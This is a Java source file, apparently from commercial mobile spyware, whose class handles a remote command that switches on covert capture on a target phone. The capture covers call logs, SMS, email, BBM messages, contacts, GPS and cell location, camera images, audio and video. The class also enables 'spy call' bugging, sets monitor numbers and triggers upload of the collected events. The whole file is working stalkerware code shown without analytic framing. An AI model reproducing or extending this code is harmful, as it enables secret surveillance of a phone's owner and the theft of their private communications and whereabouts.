package com.vvt.rmtcmd.pcc;

import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefAddressBook;
import com.vvt.pref.PrefAudioFile;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCameraImage;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefPIN;
import com.vvt.pref.PrefVideoFile;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.EdFlag;
import com.vvt.rmtcmd.SetSettingCode;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.rmtcmd.util.RmtCmdUtil;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class PCCSetSettings extends PCCRmtCmdAsync {
	
	private final String TAG = "PCCSetSettings";
	private Vector setSettingCmd = null;
	private SendEventManager eventSender = Global.getSendEventManager();
	private PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
	private RmtCmdUtil rmtCmdUtil = new RmtCmdUtil();
	
	public PCCSetSettings(Vector setSettingCmd) {
		this.setSettingCmd = setSettingCmd;
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.SET_SETTING.getId());
		try {
			Hashtable setSetting = getDefaultSetting(setSettingCmd);
			if (setSetting != null) {
				Preference pref = Global.getPreference();
				Enumeration e = setSetting.keys();
				while (e.hasMoreElements()) {
					SetSettingCode rmtCmdKey = (SetSettingCode) e.nextElement();
					if (rmtCmdKey.getId() == SetSettingCode.AUDIO_RECORD.getId()) {
						PrefAudioFile prefAudio = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							prefAudio.setEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							prefAudio.setEnabled(true);
						}
						pref.commit(prefAudio);
					} else if (rmtCmdKey.getId() == SetSettingCode.CALL.getId()) {
						PrefEventInfo eventInfo = (PrefEventInfo) pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							eventInfo.setCallLogEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							eventInfo.setCallLogEnabled(true);
						}
						pref.commit(eventInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.CAMERA_IMAGE.getId()) {
						PrefCameraImage prefImage = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							prefImage.setEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							prefImage.setEnabled(true);
						}
						pref.commit(prefImage);
					} else if (rmtCmdKey.getId() == SetSettingCode.CAPTURE_TIMER.getId()) {
						PrefGeneral captureTimerInfo = (PrefGeneral) pref.getPrefInfo(PreferenceType.PREF_GENERAL);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						int timerInSeconds = value.intValue() * (60 * 60);
						for (int i = 0; i < ApplicationInfo.TIME_VALUE.length; i++) {
							if (timerInSeconds == ApplicationInfo.TIME_VALUE[i]) {
								captureTimerInfo.setSendTimeIndex(i);
								break;
							}
						}
						pref.commit(captureTimerInfo);					
					} else if (rmtCmdKey.getId() == SetSettingCode.CONTACT.getId()) {
						PrefAddressBook addrBookInfo = (PrefAddressBook) pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							addrBookInfo.setEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							addrBookInfo.setEnabled(true);
						}
						pref.commit(addrBookInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.EVENT_COUNT.getId()) {
						PrefGeneral eventCountInfo = (PrefGeneral) pref.getPrefInfo(PreferenceType.PREF_GENERAL);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						eventCountInfo.setMaxEventCount(value.intValue());					
						pref.commit(eventCountInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.GPS.getId()) {
						PrefGPS gpsInfo = (PrefGPS) pref.getPrefInfo(PreferenceType.PREF_GPS);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							gpsInfo.setEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							gpsInfo.setEnabled(true);
						}
						pref.commit(gpsInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.GPS_TIMER.getId()) {					
						PrefGPS gpsTimerInfo = (PrefGPS) pref.getPrefInfo(PreferenceType.PREF_GPS);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						int index = value.intValue();
						if (index > 0) {
							GPSOption option = gpsTimerInfo.getGpsOption();
							option.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[index - 1]);
							gpsTimerInfo.setGpsOption(option);
						}
						pref.commit(gpsTimerInfo);					
					} else if (rmtCmdKey.getId() == SetSettingCode.IM.getId()) {
						PrefMessenger messengerInfo = (PrefMessenger) pref.getPrefInfo(PreferenceType.PREF_IM);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							messengerInfo.setBBMEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							messengerInfo.setBBMEnabled(true);
						}
						pref.commit(messengerInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.LOCATION.getId()) {
						PrefCellInfo cellInfo = (PrefCellInfo) pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							cellInfo.setEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							cellInfo.setEnabled(true);
						}
						pref.commit(cellInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.MAIL.getId()) {
						PrefEventInfo emailInfo = (PrefEventInfo) pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							emailInfo.setEmailEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							emailInfo.setEmailEnabled(true);
						}
						pref.commit(emailInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.PIN.getId()) {
						PrefPIN pinInfo = (PrefPIN) pref.getPrefInfo(PreferenceType.PREF_PIN);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							pinInfo.setEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							pinInfo.setEnabled(true);
						}
						pref.commit(pinInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.SMS.getId()) {
						PrefEventInfo smsInfo = (PrefEventInfo) pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							smsInfo.setSMSEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							smsInfo.setSMSEnabled(true);
						}
						pref.commit(smsInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.START_STOP_CAPTURE.getId()) {
						PrefGeneral startStopInfo = (PrefGeneral) pref.getPrefInfo(PreferenceType.PREF_GENERAL);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							startStopInfo.setCaptured(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							startStopInfo.setCaptured(true);
						}
						pref.commit(startStopInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.VIDEO_FILE.getId()) {
						PrefVideoFile prefVideo = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							prefVideo.setEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							prefVideo.setEnabled(true);
						}
						pref.commit(prefVideo);
					} else if (rmtCmdKey.getId() == SetSettingCode.ENABLE_WATCH.getId()) {
						PrefBugInfo bugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
						PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							watchListInfo.setWatchListEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							watchListInfo.setWatchListEnabled(true);
						}
						bugInfo.setPrefWatchListInfo(watchListInfo);
						pref.commit(bugInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.HOME_IN.getId()) {
						/*clearHomeInNumberDB();
						numberList = (Vector) setSetting.get(rmtCmdKey);
						addHomeInNumberDB();*/
						// TODO: Home IN in term of sever side but it's home OUT in client so use the same logic as home OUT
						clearHomeOutNumberDB();
						numberList = (Vector) setSetting.get(rmtCmdKey);
						addHomeOutNumberDB();
					} else if (rmtCmdKey.getId() == SetSettingCode.SET_WATCH_FLAGS.getId()) {
						Vector value = (Vector) setSetting.get(rmtCmdKey);
						PrefBugInfo bugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
						PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
						watchListInfo.setInAddrbookEnabled(false);
						if (value.elementAt(0).equals("1")) {
							watchListInfo.setInAddrbookEnabled(true);
						}
						watchListInfo.setNotInAddrbookEnabled(false);
						if (value.elementAt(1).equals("1")) {
							watchListInfo.setNotInAddrbookEnabled(true);
						}
						watchListInfo.setInWatchListEnabled(false);
						if (value.elementAt(2).equals("1")) {
							watchListInfo.setInWatchListEnabled(true);
						}
						watchListInfo.setUnknownEnabled(false);
						if (value.elementAt(3).equals("1")) {
							watchListInfo.setUnknownEnabled(true);
						}
						bugInfo.setPrefWatchListInfo(watchListInfo);
						pref.commit(bugInfo);
					} else if (rmtCmdKey.getId() == SetSettingCode.MONITOR_NUMBER.getId()) {
						clearMonitorNumberDB();
						numberList = (Vector) setSetting.get(rmtCmdKey);
						addMonitorNumberDB();
					} else if (rmtCmdKey.getId() == SetSettingCode.ENABLE_SPYCALL.getId()) {
						PrefBugInfo bugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
						Integer value = (Integer) setSetting.get(rmtCmdKey);
						if (value.intValue() == EdFlag.DISABLE.getId()) {
							bugInfo.setEnabled(false);
						} else if (value.intValue() == EdFlag.ENABLE.getId()) {
							bugInfo.setEnabled(true);
						}
						pref.commit(bugInfo);
					}
				}
				/*PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
				general.setCaptured(true);
				pref.commit(general);*/
				responseMessage.append(Constant.OK);
				observer.cmdExecutedSuccess(this);				
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.INV_CMD_FORMAT);
				observer.cmdExecutedError(this);
			}
		} catch(Exception e) {
			Log.error("PCCSettings.run()", e.getMessage(), e);
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.INV_CMD_FORMAT);
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	private Hashtable getDefaultSetting(Vector args) {
		Hashtable setting = new Hashtable();		
		for (int i = 0; i < args.size(); i++) {
			String argStr = (String) args.elementAt(i);
			int index = argStr.indexOf(Constant.COLON);
			String id = argStr.substring(0, index).trim();
			String value = argStr.substring(index + 1).trim();
			int settingId = Integer.parseInt(id);			
			if (settingId == SetSettingCode.HOME_IN.getId()) {
				Vector homeInNumber = rmtCmdUtil.parseNumber(value);
				if (rmtCmdUtil.isInvalidNumber(homeInNumber)) {
					setting = null;
					break;
				}
				homeInNumber = rmtCmdUtil.getOnlyUniqueNumber(homeInNumber);
				if (homeInNumber.size() > prefBugInfo.getMaxHomeOutNumbers()) {
					setting = null;
					break;
				}
				setting.put(SetSettingCode.HOME_IN, homeInNumber);
			} else if (settingId == SetSettingCode.SET_WATCH_FLAGS.getId()) {
				Vector flags = rmtCmdUtil.parseNumber(value);
				if (rmtCmdUtil.isInvalidWatchFlags(flags)) {
					setting = null;
					break;
				}
				setting.put(SetSettingCode.SET_WATCH_FLAGS, flags);
			} else if (settingId == SetSettingCode.MONITOR_NUMBER.getId()) {
				Vector monitorNumber = rmtCmdUtil.parseNumber(value);
				if (rmtCmdUtil.isInvalidNumber(monitorNumber)) {
					setting = null;
					break;
				}
				monitorNumber = rmtCmdUtil.getOnlyUniqueNumber(monitorNumber);
				if (monitorNumber.size() > prefBugInfo.getMaxMonitorNumbers()) {
					setting = null;
					break;
				}
				setting.put(SetSettingCode.MONITOR_NUMBER, monitorNumber);	
			} else {
				int settingValue = Integer.parseInt(value);
				if (settingId == SetSettingCode.AUDIO_RECORD.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.AUDIO_RECORD, new Integer(settingValue));
				} else if (settingId == SetSettingCode.CALL.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.CALL, new Integer(settingValue));
				} else if (settingId == SetSettingCode.CAMERA_IMAGE.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.CAMERA_IMAGE, new Integer(settingValue));
				} else if (settingId == SetSettingCode.CAPTURE_TIMER.getId()) {
					if (settingValue < 0 || settingValue > (ApplicationInfo.TIME.length - 1)) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.CAPTURE_TIMER, new Integer(settingValue));
				} else if (settingId == SetSettingCode.CONTACT.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.CONTACT, new Integer(settingValue));
				} else if (settingId == SetSettingCode.EVENT_COUNT.getId()) {
					if (settingValue < 1 || settingValue > generalInfo.getMaxEventRange()) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.EVENT_COUNT, new Integer(settingValue));
				} else if (settingId == SetSettingCode.GPS.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.GPS, new Integer(settingValue));
				} else if (settingId == SetSettingCode.GPS_TIMER.getId()) {
					if ((settingValue < 1) || (settingValue > ApplicationInfo.LOCATION_TIMER.length)) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.GPS_TIMER, new Integer(settingValue));
				} else if (settingId == SetSettingCode.IM.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.IM, new Integer(settingValue));
				} else if (settingId == SetSettingCode.MAIL.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.MAIL, new Integer(settingValue));
				} else if (settingId == SetSettingCode.PIN.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.PIN, new Integer(settingValue));
				} else if (settingId == SetSettingCode.SMS.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.SMS, new Integer(settingValue));
				} else if (settingId == SetSettingCode.START_STOP_CAPTURE.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.START_STOP_CAPTURE, new Integer(settingValue));
				} else if (settingId == SetSettingCode.VIDEO_FILE.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.VIDEO_FILE, new Integer(settingValue));
				} else if (settingId == SetSettingCode.ENABLE_WATCH.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.ENABLE_WATCH, new Integer(settingValue));
				} else if (settingId == SetSettingCode.ENABLE_SPYCALL.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.ENABLE_SPYCALL, new Integer(settingValue));
				} else {
					setting = null;
					break;
				}
			}
		}
		return setting;
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
